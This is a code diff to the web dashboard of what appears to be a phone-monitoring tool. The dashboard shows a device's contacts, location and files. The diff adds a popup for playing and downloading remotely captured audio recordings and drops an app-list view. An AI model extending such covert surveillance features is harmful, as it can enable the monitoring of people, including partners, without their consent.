@@ -178,6 +178,19 @@
         </div>
     </div>
 
+    <!-- Audio Popup Modal -->
+    <div id="audio-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(15,23,42,0.95); z-index: 9999; display: flex; align-items: center; justify-content: center;">
+        <div class="card p-4 text-center" style="width: 400px; border-radius: 20px;">
+            <i class="fas fa-microphone-alt fa-3x text-danger mb-3"></i>
+            <h5 class="fw-bold">New Recording Ready</h5>
+            <audio id="audio-player" controls class="w-100 my-3"></audio>
+            <div class="d-flex gap-2">
+                <button class="btn btn-secondary flex-grow-1" onclick="document.getElementById('audio-modal').classList.add('d-none'); document.getElementById('audio-player').pause();">CLOSE</button>
+                <a id="audio-download" href="#" class="btn btn-primary flex-grow-1">DOWNLOAD</a>
+            </div>
+        </div>
+    </div>
+
     <script>
         const socket = io({ query: { type: 'web' } });
         let currentPath = "/sdcard/";
@@ -216,9 +229,15 @@
             data.contacts.sort((a,b)=>a.name.localeCompare(b.name)).forEach(c => { body.innerHTML += `<tr><td>${c.name}</td><td>${c.number}</td></tr>`; });
         });
 
-        socket.on('child_apps', (data) => {
-            const body = document.getElementById('apps-list'); body.innerHTML = '';
-            data.apps.sort((a,b)=>a.name.localeCompare(b.name)).forEach(a => { body.innerHTML += `<li class="list-group-item d-flex justify-content-between align-items-center">${a.name} <span class="text-muted x-small">${a.package}</span></li>`; });
+        socket.on('audio_ready', (data) => {
+            const modal = document.getElementById('audio-modal');
+            const player = document.getElementById('audio-player');
+            const download = document.getElementById('audio-download');
+            player.src = data.url;
+            download.href = data.url;
+            download.setAttribute('download', data.name);
+            modal.classList.remove('d-none');
+            log("System: New audio recording received!");
         });
 
         socket.on('child_location_update', (data) => {
